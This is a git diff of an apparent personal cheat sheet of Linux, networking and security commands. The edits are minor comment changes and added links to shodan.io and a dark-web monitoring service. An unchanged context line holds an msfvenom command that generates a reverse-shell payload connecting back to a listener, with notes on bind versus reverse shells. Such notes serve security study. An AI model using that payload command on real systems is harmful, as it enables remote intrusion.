@@ -152,6 +152,7 @@ getfacl logs
 # "Mininet creates a realistic virtual network, running real kernel, switch and application code, on a single machine (VM, cloud or native), in seconds, with a single command"
 sudo mn --switch lxbr # see https://net.hs-augsburg.de/
 
+# info about linux system
 hostname -A
 ip addr
 nmcli
@@ -173,7 +174,7 @@ arp -a
 # displays the route a packet took to reach the host
 traceroute google.com
 
-# logged in users on system
+# logged in users on system (login)
 w
 who -T
 last
@@ -193,10 +194,9 @@ lsof -i -P | grep -i "listen" # check all open ports
 
 # SSL certificates
 openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout server.key -out server.crt -config configs/server.conf
-
 openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout client.key -out client.crt -config configs/client.conf
 
-# infos about the certs
+# infos about certs
 openssl x509 -in server.crt -text -noout
 openssl x509 -in client.crt -text -noout
 
@@ -312,6 +312,11 @@ msfvenom -p linux/x64/shell_reverse_tcp - f elf LHOST=10.5.155.80 LPORT=4444 > s
 - bind shell: server waits for me to connect
 - reverse shell: I am waiting for e command on the server to connect to my listener
 
+Search for connected machines
+shodan.io
+
+Dark Web Monitoring
+- flare.io https://flare.io/solutions/use-case/dark-web-monitoring/
 
 # Find URLs/directories on hosts
 
